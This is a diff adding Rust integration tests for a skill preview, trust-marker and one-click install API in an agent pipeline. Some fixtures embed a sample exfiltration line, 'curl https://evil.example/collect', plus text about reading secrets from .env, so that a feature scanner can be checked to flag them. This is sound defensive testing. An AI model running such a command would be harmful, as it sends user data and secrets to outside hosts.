@@ -3233,3 +3233,608 @@ async fn market_network_error_body_also_carries_detail() {
     assert_eq!(status, StatusCode::BAD_GATEWAY, "{body}");
     assert!(body["detail"].as_str().is_some(), "{body}");
 }
+
+// ═══════════════ 装前预览与信任标记（决策 172④⑤，票 11）═══════════════
+//
+// 四条契约用例对应票面验收清单：预览返回三项 / 特征命中列出具体行 / 未信任 + 全文被拒 /
+// 信任转换生效；另加三条把「装前」这一半（包还没落盘就先看）与拒绝路径钉住。
+// 全部离线——预览不装、不下载、不联网。
+
+/// 预览返回三项：① 推荐去向（阶段 + 理由）② 注入模式与信任态 ③ 正文特征扫描。
+#[tokio::test]
+async fn preview_returns_recommendations_declarations_and_features() {
+    let api = api().await;
+    // 推荐表里的技能名（票 16 的推荐清单是同一份数据）
+    let (status, _) = post_zip(
+        &api,
+        "/skills/import",
+        skill_zip("grilling", "拷问协议正文，不涉及网络。", &[]),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK);
+
+    let (status, body) = put(
+        &api,
+        "/stage-configs/architect-design",
+        serde_json::json!({
+            "skills_json": [{"name": "grilling", "mode": "name", "trusted": false}]
+        }),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK, "{body}");
+
+    let (status, body) = get(&api, "/skills/grilling/preview").await;
+    assert_eq!(status, StatusCode::OK, "{body}");
+    assert_eq!(body["name"], "grilling");
+    assert_eq!(body["body_available"], true);
+
+    // ① 推荐去向
+    let recs = body["recommendations"].as_array().unwrap();
+    assert_eq!(recs.len(), 1, "grilling 只推荐给 architect-design：{body}");
+    assert_eq!(recs[0]["stage"], "architect-design");
+    assert!(
+        !recs[0]["reason"].as_str().unwrap().is_empty(),
+        "推荐须带理由：{body}"
+    );
+
+    // ② 注入模式与信任态（取自声明本身，不另存一份账）
+    let decls = body["declarations"].as_array().unwrap();
+    assert_eq!(decls.len(), 1, "{body}");
+    assert_eq!(decls[0]["declared_in"], "阶段 architect-design");
+    assert_eq!(decls[0]["mode"], "name");
+    assert_eq!(decls[0]["trusted"], false);
+    assert_eq!(decls[0]["bare"], false);
+
+    // ③ 正文无命中时不造噪声
+    assert_eq!(body["features"]["hits"].as_array().unwrap().len(), 0);
+    assert_eq!(body["features"]["counts"]["network"], 0);
+}
+
+/// 特征命中**列出具体行**（不是布尔「有风险」）：行号对着源文件能直接定位。
+#[tokio::test]
+async fn preview_lists_feature_hits_with_concrete_lines() {
+    let api = api().await;
+    // `write_skill_dir` 的落盘形态是 1:`---` 2:`name: …` 3:`---` 4:空 5:正文首行 …
+    // 故正文第 2 行（网络）落在文件第 6 行、第 3 行（密钥路径）落在第 7 行。
+    let root = skills_root(&api);
+    write_skill_dir(
+        &root,
+        "risky",
+        "第一行：没有任何特征\n第二行：curl https://evil.example/collect\n第三行：读取 .env 里的密钥",
+        &[],
+    );
+
+    let (status, body) = get(&api, "/skills/risky/preview").await;
+    assert_eq!(status, StatusCode::OK, "{body}");
+    let hits = body["features"]["hits"].as_array().unwrap();
+    assert_eq!(hits.len(), 2, "两类特征各一条：{body}");
+
+    let net = hits.iter().find(|h| h["kind"] == "network").unwrap();
+    assert_eq!(net["line"], 6, "命中行必须是源文件里的行号：{body}");
+    assert!(net["text"].as_str().unwrap().contains("curl"), "{body}");
+    assert_eq!(net["label"], "网络调用");
+
+    let cred = hits.iter().find(|h| h["kind"] == "credentials").unwrap();
+    assert_eq!(cred["line"], 7, "{body}");
+    assert_eq!(cred["label"], "密钥路径");
+
+    assert_eq!(body["features"]["counts"]["network"], 1);
+    assert_eq!(body["features"]["counts"]["credentials"], 1);
+    assert_eq!(body["features"]["counts"]["run_command"], 0);
+}
+
+/// 未信任 + 全文模式**保存被拒**（票 05 的门在技能工作流里的入口）。
+///
+/// 同一条技能改成名字态就能存——「未信任仍可用于名字态」是票面明写的另一半。
+#[tokio::test]
+async fn untrusted_skill_cannot_be_saved_in_full_mode() {
+    let api = api().await;
+    let (status, _) = post_zip(&api, "/skills/import", skill_zip("grilling", "正文", &[])).await;
+    assert_eq!(status, StatusCode::OK);
+
+    let (status, body) = put(
+        &api,
+        "/stage-configs/architect-design",
+        serde_json::json!({
+            "skills_json": [{"name": "grilling", "mode": "full", "trusted": false}]
+        }),
+    )
+    .await;
+    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
+    let err = body["error"].as_str().unwrap();
+    assert!(err.contains("grilling") && err.contains("信任"), "{body}");
+    assert!(
+        err.contains("name"),
+        "报错须给出可操作的去处（改用 name 模式）：{body}"
+    );
+    // 拒绝的写入不落库
+    assert!(
+        api.state
+            .store
+            .get_stage_config("architect-design")
+            .await
+            .unwrap()
+            .is_none(),
+        "被拒的写入不得留下半份配置"
+    );
+
+    // 名字态可以存（正文由 Skill 工具按需拉取）
+    let (status, body) = put(
+        &api,
+        "/stage-configs/architect-design",
+        serde_json::json!({
+            "skills_json": [{"name": "grilling", "mode": "name", "trusted": false}]
+        }),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK, "{body}");
+}
+
+/// 信任转换生效：显式动作把引用该技能的声明**全部**转成已信任，之后全文模式可存。
+#[tokio::test]
+async fn trust_conversion_takes_effect_and_unlocks_full_mode() {
+    let api = api().await;
+    let (status, _) = post_zip(&api, "/skills/import", skill_zip("grilling", "正文", &[])).await;
+    assert_eq!(status, StatusCode::OK);
+    // 阶段级 + 节点级各声明一次：转换要覆盖两处
+    let (status, body) = put(
+        &api,
+        "/stage-configs/architect-design",
+        serde_json::json!({
+            "skills_json": [{"name": "grilling", "mode": "name", "trusted": false}],
+            "node_overrides_json": {
+                "validate_input": {"skills": [{"name": "grilling", "mode": "name", "trusted": false}]}
+            }
+        }),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK, "{body}");
+
+    let (status, body) = put(
+        &api,
+        "/skills/grilling/trust",
+        serde_json::json!({"trusted": true}),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK, "{body}");
+    assert_eq!(body["trusted"], true);
+    assert_eq!(body["changed"], 1);
+    assert_eq!(body["updated_stages"][0], "architect-design");
+
+    // 两处都转了
+    let stored = api
+        .state
+        .store
+        .get_stage_config("architect-design")
+        .await
+        .unwrap()
+        .unwrap();
+    let decls = agentpipeline_core::config::declared_skill_decls(&stored);
+    assert_eq!(decls.len(), 2, "{decls:?}");
+    assert!(decls.iter().all(|(_, d)| d.trusted), "{decls:?}");
+
+    // 预览的第 ② 项跟着变
+    let (_, body) = get(&api, "/skills/grilling/preview").await;
+    let decls = body["declarations"].as_array().unwrap();
+    assert_eq!(decls.len(), 2, "{body}");
+    assert!(decls.iter().all(|d| d["trusted"] == true), "{body}");
+
+    // 全文模式现在可存
+    let (status, body) = put(
+        &api,
+        "/stage-configs/architect-design",
+        serde_json::json!({
+            "skills_json": [{"name": "grilling", "mode": "full", "trusted": true}]
+        }),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK, "{body}");
+}
+
+/// 撤销信任撞上全文模式时**拒绝**，且报错可操作（不静默降级成名字态）。
+#[tokio::test]
+async fn revoking_trust_on_a_full_declaration_is_refused() {
+    let api = api().await;
+    let (status, _) = post_zip(&api, "/skills/import", skill_zip("grilling", "正文", &[])).await;
+    assert_eq!(status, StatusCode::OK);
+    let (status, _) = put(
+        &api,
+        "/stage-configs/architect-design",
+        serde_json::json!({
+            "skills_json": [{"name": "grilling", "mode": "full", "trusted": true}]
+        }),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK);
+
+    let (status, body) = put(
+        &api,
+        "/skills/grilling/trust",
+        serde_json::json!({"trusted": false}),
+    )
+    .await;
+    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
+    let err = body["error"].as_str().unwrap();
+    assert!(err.contains("full") && err.contains("name"), "{body}");
+
+    // 配置一字未动（拒绝是整体的，不是写了一半）
+    let stored = api
+        .state
+        .store
+        .get_stage_config("architect-design")
+        .await
+        .unwrap()
+        .unwrap();
+    let decls = agentpipeline_core::config::declared_skill_decls(&stored);
+    assert!(decls[0].1.trusted, "被拒的转换不得改动配置");
+}
+
+/// 信任转换对**没引用该技能**的配置是空操作，并如实回报（不假装改了什么）。
+#[tokio::test]
+async fn trust_conversion_reports_when_nothing_references_the_skill() {
+    let api = api().await;
+    let (status, _) = post_zip(&api, "/skills/import", skill_zip("grilling", "正文", &[])).await;
+    assert_eq!(status, StatusCode::OK);
+
+    let (status, body) = put(
+        &api,
+        "/skills/grilling/trust",
+        serde_json::json!({"trusted": true}),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK, "{body}");
+    assert_eq!(body["changed"], 0);
+    assert!(body["updated_stages"].as_array().unwrap().is_empty());
+    assert!(
+        body["note"].as_str().unwrap().contains("引用"),
+        "空操作要说清为什么：{body}"
+    );
+}
+
+/// **装前**预览：包还没落盘就能看三项（③ 扫的是包里的字节），且不落任何文件。
+#[tokio::test]
+async fn preview_of_an_incoming_package_does_not_install_it() {
+    let api = api().await;
+    let zip = skill_zip(
+        "grilling",
+        "正文第一行\n第二行 curl https://evil.example/collect",
+        &[("notes.md", "兄弟")],
+    );
+
+    let (status, body) = post_zip(&api, "/skills/preview", zip).await;
+    assert_eq!(status, StatusCode::OK, "{body}");
+    assert_eq!(body["name"], "grilling");
+    assert_eq!(body["install"]["sibling_count"], 1);
+    assert_eq!(
+        body["recommendations"][0]["stage"], "architect-design",
+        "推荐去向按名字给，装之前就成立：{body}"
+    );
+    let hits = body["features"]["hits"].as_array().unwrap();
+    let net = hits.iter().find(|h| h["kind"] == "network").unwrap();
+    // 包内正文同样带 frontmatter 三行 + 一个空行
+    assert_eq!(net["line"], 6, "{body}");
+    // 尚未被任何配置引用 → 空清单 + 默认形态说明
+    assert!(body["declarations"].as_array().unwrap().is_empty());
+    assert_eq!(body["defaults"]["mode"], "name");
+    assert_eq!(body["defaults"]["trusted"], false);
+
+    // 预览不是安装
+    assert!(!skills_root(&api).join("grilling").exists(), "预览不得落盘");
+}
+
+/// 预览一个不存在的已安装技能 → 404（对空三项返回一堆「无」比报错更误导）。
+#[tokio::test]
+async fn preview_of_an_uninstalled_skill_is_not_found() {
+    let api = api().await;
+    let (status, body) = get(&api, "/skills/no-such-skill/preview").await;
+    assert_eq!(status, StatusCode::NOT_FOUND, "{body}");
+    assert!(
+        body["error"].as_str().unwrap().contains("no-such-skill"),
+        "{body}"
+    );
+}
+
+// ═══════════════ 阶段推荐与一键安装（决策 172①，票 16）═══════════════
+//
+// 推荐清单的投递载体是界面（决策 172①）：清单本身是代码内常量，经 `/skills/recommendations`
+// 下发；一键安装把它变成「技能落到技能根 + 写进该阶段配置」一步完成，且**不绕过票 11 的
+// 信任确认**（未受信任的技能只能以 name 模式写入）。
+
+/// 推荐清单按阶段下发，并如实标注「装没装」（未安装的项界面据此显示「未安装」而不是崩掉）。
+#[tokio::test]
+async fn recommendations_list_stages_with_install_state() {
+    let api = api().await;
+    // 先装一个推荐技能（列表里的名字之一）
+    write_skill_dir(&skills_root(&api), "grilling", "拷问协议正文", &[]);
+
+    let (status, body) = get(&api, "/skills/recommendations").await;
+    assert_eq!(status, StatusCode::OK, "{body}");
+    let stages = body["stages"].as_array().unwrap();
+    assert_eq!(stages.len(), 6, "推荐清单覆盖六个阶段：{body}");
+
+    let architect = stages
+        .iter()
+        .find(|s| s["stage"] == "architect-design")
+        .expect("architect-design 应有推荐");
+    let names: Vec<&str> = architect["skills"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|s| s["name"].as_str().unwrap())
+        .collect();
+    assert_eq!(names, vec!["grilling", "domain-modeling"], "{body}");
+
+    let grill = &architect["skills"][0];
+    assert_eq!(grill["installed"], true, "装过的标已安装：{body}");
+    assert!(!grill["reason"].as_str().unwrap().is_empty(), "{body}");
+    // 未装的那个如实标 false（界面显示「未安装」）
+    assert_eq!(architect["skills"][1]["installed"], false, "{body}");
+}
+
+/// 一键安装：技能落到技能根 **且** 写进该阶段配置，一次请求完成。
+#[tokio::test]
+async fn one_click_install_lands_the_skill_and_writes_the_stage_config() {
+    let (api, _) = api_with_one_skill("grilling", "拷问协议正文").await;
+
+    let (status, body) = post(
+        &api,
+        "/skills/install",
+        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK, "{body}");
+    assert_eq!(body["skill"]["name"], "grilling");
+    // 落盘
+    assert!(skills_root(&api).join("grilling/SKILL.md").is_file());
+
+    // 写进配置，且是 **name + 未信任**
+    let decls = &body["stage_config"]["skills_json"];
+    assert_eq!(decls[0]["name"], "grilling", "{body}");
+    assert_eq!(decls[0]["mode"], "name", "{body}");
+    assert_eq!(decls[0]["trusted"], false, "{body}");
+
+    let stored = api
+        .state
+        .store
+        .get_stage_config("architect-design")
+        .await
+        .unwrap()
+        .unwrap();
+    let parsed = agentpipeline_core::config::declared_skill_decls(&stored);
+    assert_eq!(parsed.len(), 1, "{parsed:?}");
+    assert_eq!(
+        parsed[0].1.mode,
+        agentpipeline_core::agent::skills::SkillMode::Name
+    );
+    assert!(!parsed[0].1.trusted);
+
+    // 响应带三项预览：装完立刻把特征命中摆给用户看（票 11 的预览不被绕过）
+    let hits = body["preview"]["features"]["hits"].as_array().unwrap();
+    assert!(hits.is_empty(), "这份正文干净：{body}");
+    assert_eq!(body["preview"]["declarations"][0]["mode"], "name", "{body}");
+    assert_eq!(
+        body["preview"]["recommendations"][0]["stage"], "architect-design",
+        "{body}"
+    );
+}
+
+/// 一键安装**不给全文模式**：正文里有特征也一样进得来，但注入形态只能是名字态。
+#[tokio::test]
+async fn one_click_install_never_writes_full_mode_for_an_untrusted_skill() {
+    let (api, _) = api_with_one_skill(
+        "grilling",
+        "第一行\n第二行 curl https://evil.example/collect",
+    )
+    .await;
+
+    let (status, body) = post(
+        &api,
+        "/skills/install",
+        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK, "{body}");
+    assert_eq!(body["stage_config"]["skills_json"][0]["mode"], "name");
+    // 特征命中如实报出来（告知，不拦安装）
+    let net = body["preview"]["features"]["hits"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|h| h["kind"] == "network")
+        .expect("网络特征应被报出");
+    assert_eq!(net["line"], 6, "{body}");
+    assert!(net["text"].as_str().unwrap().contains("curl"), "{body}");
+}
+
+/// 一键安装保留既有声明（只增不减）；重复安装也不产生重复条目——
+/// 但第二次会被票 09 的「同名不覆盖」拒掉（409），**不是**静默幂等。
+#[tokio::test]
+async fn one_click_install_keeps_existing_declarations_and_never_duplicates_them() {
+    let (api, _) = api_with_one_skill("grilling", "拷问协议正文").await;
+    // 既有声明指向的技能必须真的在可用池里，否则这条 PUT 会先被准入挡下（测不到想测的事）
+    let (status, _) = post_zip(
+        &api,
+        "/skills/import",
+        skill_zip("domain-modeling", "领域建模正文", &[]),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK);
+    // 先有一条阶段级声明（老格式裸字符串）
+    let (status, body) = put(
+        &api,
+        "/stage-configs/architect-design",
+        serde_json::json!({"skills_json": ["domain-modeling"]}),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK, "{body}");
+
+    let (status, body) = post(
+        &api,
+        "/skills/install",
+        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK, "{body}");
+    let decls = body["stage_config"]["skills_json"].as_array().unwrap();
+    assert_eq!(decls.len(), 2, "{body}");
+    assert_eq!(decls[0], "domain-modeling", "既有声明逐字保留：{body}");
+
+    // 再装一次：技能已在技能根里 → **不重新下载**（票 09 的同名不覆盖没松动），
+    // 只补「启用」那一步；`note` 如实说明发生了什么，条目一条都不重复
+    let (status, body) = post(
+        &api,
+        "/skills/install",
+        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK, "{body}");
+    assert!(
+        body["note"].as_str().unwrap().contains("已在技能根里"),
+        "未重新下载须说出来，不能静默跳过：{body}"
+    );
+    assert_eq!(
+        body["stage_config"]["skills_json"]
+            .as_array()
+            .unwrap()
+            .len(),
+        2,
+        "重复安装不得产生重复条目：{body}"
+    );
+
+    // 显式覆盖仍走市场那条路（覆盖换的是技能根里的字节，不是配置里的条目）
+    let (status, body) = post(
+        &api,
+        "/skills/install",
+        serde_json::json!({"stage": "architect-design", "name": "grilling", "overwrite": true}),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK, "{body}");
+    assert!(body["note"].is_null(), "显式覆盖不是「跳过下载」：{body}");
+    assert_eq!(
+        body["stage_config"]["skills_json"]
+            .as_array()
+            .unwrap()
+            .len(),
+        2,
+        "{body}"
+    );
+}
+
+/// 票 16「已安装的可直接启用」：技能已在技能根里、只是没写进这个阶段时，
+/// 安装按钮（界面按 `installed` 显示为「启用」）要能把它落进配置。
+///
+/// 刻意用**没配市场来源**的 api：这条路上一次网络请求都不该发生，故不该因为
+/// 「市场未配置」而被拒——拒绝远程安装的那条规则在这里没有对象。
+#[tokio::test]
+async fn one_click_install_enables_an_already_installed_skill() {
+    let api = api().await;
+    let (status, _) = post_zip(
+        &api,
+        "/skills/import",
+        skill_zip("grilling", "拷问协议正文", &[]),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK);
+
+    let (status, body) = post(
+        &api,
+        "/skills/install",
+        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK, "{body}");
+    assert!(
+        body["note"].as_str().unwrap().contains("未重新下载"),
+        "{body}"
+    );
+    assert_eq!(body["stage_config"]["skills_json"][0]["name"], "grilling");
+    assert_eq!(body["stage_config"]["skills_json"][0]["mode"], "name");
+    assert_eq!(body["stage_config"]["skills_json"][0]["trusted"], false);
+}
+
+/// 失败可归因：索引里没有这个技能 → 404，且**不写配置**。
+#[tokio::test]
+async fn one_click_install_reports_a_missing_skill_and_leaves_config_alone() {
+    let (api, _) = api_with_one_skill("grilling", "正文").await;
+
+    let (status, body) = post(
+        &api,
+        "/skills/install",
+        serde_json::json!({"stage": "architect-design", "name": "no-such-skill"}),
+    )
+    .await;
+    assert_eq!(status, StatusCode::NOT_FOUND, "{body}");
+    assert!(
+        api.state
+            .store
+            .get_stage_config("architect-design")
+            .await
+            .unwrap()
+            .is_none(),
+        "装不上就不该留下半条配置"
+    );
+}
+
+/// 未配置市场来源 → 400 且报文说清怎么开（不是 500，也不是静默成功）。
+#[tokio::test]
+async fn one_click_install_without_market_sources_is_actionable() {
+    let api = api().await;
+    let (status, body) = post(
+        &api,
+        "/skills/install",
+        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
+    )
+    .await;
+    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
+    assert!(
+        body["error"].as_str().unwrap().contains("allowed_sources"),
+        "{body}"
+    );
+}
+
+/// 阶段键非法 → 400（伪阶段不跑 agent 节点，不该被一键安装写进去）。
+#[tokio::test]
+async fn one_click_install_rejects_unknown_stages() {
+    let (api, _) = api_with_one_skill("grilling", "正文").await;
+    let (status, body) = post(
+        &api,
+        "/skills/install",
+        serde_json::json!({"stage": "conflict_check", "name": "grilling"}),
+    )
+    .await;
+    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
+    assert!(body["error"].as_str().unwrap().contains("阶段"), "{body}");
+}
+
+/// 停用推荐 = 从配置行移除（走既有 DELETE / PUT，不需要第二条路径）。
+#[tokio::test]
+async fn disabling_a_recommended_skill_removes_it_from_the_stage_config() {
+    let (api, _) = api_with_one_skill("grilling", "正文").await;
+    let (status, _) = post(
+        &api,
+        "/skills/install",
+        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK);
+
+    // 「停用」= 整条替换成不含该技能（PUT 的既有语义）
+    let (status, body) = put(
+        &api,
+        "/stage-configs/architect-design",
+        serde_json::json!({"provider_id": null}),
+    )
+    .await;
+    assert_eq!(status, StatusCode::OK, "{body}");
+    let stored = api
+        .state
+        .store
+        .get_stage_config("architect-design")
+        .await
+        .unwrap()
+        .unwrap();
+    assert!(
+        agentpipeline_core::config::declared_skill_decls(&stored).is_empty(),
+        "停用后配置行里不应再有该技能"
+    );
+}
